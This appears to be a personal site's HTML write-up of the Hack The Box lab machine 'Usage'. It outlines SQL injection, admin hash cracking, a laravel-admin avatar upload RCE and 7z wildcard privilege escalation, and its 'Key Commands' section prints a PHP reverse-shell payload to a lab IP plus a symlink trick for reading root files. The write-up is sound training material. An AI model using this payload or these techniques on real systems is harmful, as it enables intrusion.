@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Usage | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Web Exploitation</p>
+      <h1>HTB Usage</h1>
+      <p class="headline">SQL injection, laravel-admin avatar upload RCE and wildcard archive abuse</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Usage contains a SQL injection in the forgot-password workflow. Database extraction reveals an administrator hash, which is cracked and used to access the admin panel.</p>
+<h2>Initial Access</h2>
+<p>The laravel-admin avatar upload path can be abused by uploading PHP content with a double extension. Browsing to the stored file executes the payload and returns a shell.</p>
+<h2>User Pivot</h2>
+<p>A <code>.monitrc</code> file exposes credentials for the <code>xander</code> user, allowing SSH access.</p>
+<h2>Privilege Escalation</h2>
+<p><code>xander</code> can run a custom backup helper with sudo. Reverse engineering shows that it invokes <code>7z</code> over <code>/var/www/html/*</code>, making it vulnerable to wildcard tricks that read root-owned files through crafted filenames and symlinks.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">hashcat &lt;admin-hash&gt; /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</code></pre>
+<pre><code class="language-bash">&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1&#39;&quot;); ?&gt;</code></pre>
+<pre><code class="language-bash">sudo /usr/bin/usage_management</code></pre>
+<pre><code class="language-bash">ln -s /root/root.txt @root.txt</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241108194839.png" alt="usage evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241108194854.png" alt="usage evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241108221133.png" alt="usage evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241108221221.png" alt="usage evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112200249.png" alt="usage evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112200646.png" alt="usage evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112200750.png" alt="usage evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112200946.png" alt="usage evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112201833.png" alt="usage evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112202419.png" alt="usage evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112201952.png" alt="usage evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112202102.png" alt="usage evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112203755.png" alt="usage evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112203818.png" alt="usage evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112204333.png" alt="usage evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112204406.png" alt="usage evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112204631.png" alt="usage evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112204732.png" alt="usage evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112204940.png" alt="usage evidence 19" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112205023.png" alt="usage evidence 20" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112205055.png" alt="usage evidence 21" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112205435.png" alt="usage evidence 22" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112205635.png" alt="usage evidence 23" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212150.png" alt="usage evidence 24" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212342.png" alt="usage evidence 25" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212405.png" alt="usage evidence 26" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212510.png" alt="usage evidence 27" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212714.png" alt="usage evidence 28" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112212909.png" alt="usage evidence 29" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213014.png" alt="usage evidence 30" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213032.png" alt="usage evidence 31" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213403.png" alt="usage evidence 32" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213658.png" alt="usage evidence 33" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213915.png" alt="usage evidence 34" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112213949.png" alt="usage evidence 35" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112215600.png" alt="usage evidence 36" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/usage/Pasted%20image%2020241112215616.png" alt="usage evidence 37" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
